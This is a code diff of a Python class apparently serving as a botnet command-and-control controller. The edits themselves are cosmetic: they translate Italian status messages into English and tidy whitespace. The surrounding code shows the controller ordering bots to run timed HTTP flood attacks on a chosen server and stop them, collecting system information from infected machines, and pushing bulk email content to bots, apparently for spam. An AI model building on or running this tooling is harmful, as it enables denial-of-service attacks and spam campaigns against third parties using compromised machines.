@@ -144,7 +144,7 @@ class CC:
             del self.activeBot[k]
 
     def getHTTPStatus(self, target=""):
-        print("Invio richiesta...")
+        print("Sending requests")
         if target == "":
             for k, v in self.activeBot.items():
                 try:
@@ -166,10 +166,10 @@ class CC:
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
-        print("Richiesta inviata")
+        print("Requests sent")
 
     def makeHTTPRequest(self, server, time=1, target=""):
-        print("Invio richiesta...")
+        print("Sending requests...")
         headers = {'Content-Type': 'application/json', 'User-agent': 'Mozilla/5.0'}
         data = {"url": server, "time": time}
         if target == "":
@@ -193,10 +193,10 @@ class CC:
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
-        print("Richiesta inviata")
+        print("Requests sent")
 
     def stopHTTPAttack(self, target=""):
-        print("Invio richiesta...")
+        print("Sending requests")
         if target == "":
             for k, v in self.activeBot.items():
                 try:
@@ -218,7 +218,7 @@ class CC:
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
-        print("Richiesta inviata")
+        print("Requests sent")
 
     def getHTTPSystemInfo(self, target=""):
         if target == "":
@@ -228,7 +228,7 @@ class CC:
                     req = Request(url)
                     res = urlopen(req, timeout=10)
                     res = json.loads(res.read())
-                    print("\t-----System info about", k, "-----")
+                    print("\n\t-----System info about", k, "-----")
                     for j,z in res.items():
                         if len(j) <= 6:
                             print("\t" + j + ":\t\t\t", z)
@@ -257,7 +257,6 @@ class CC:
         messaggio = None
         headers = {'Content-Type': 'application/json', 'User-agent': 'Mozilla/5.0'}
 
-
         try:
             with open("email.json", 'r') as f:
                 res = json.load(f)
@@ -270,7 +269,7 @@ class CC:
         data = {"oggetto": oggetto, "messaggio": messaggio, "utenti": users}
 
 
-        print("Invio richiesta...")
+        print("Sending requests...")
         if target == "":
             for k, v in self.activeBot.items():
                 try:
@@ -292,7 +291,7 @@ class CC:
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
-        print("Richiesta inviata")
+        print("Requests sent")
 
     def makeIRCRequest(self, server, time=1, target=""):
         s = irc()
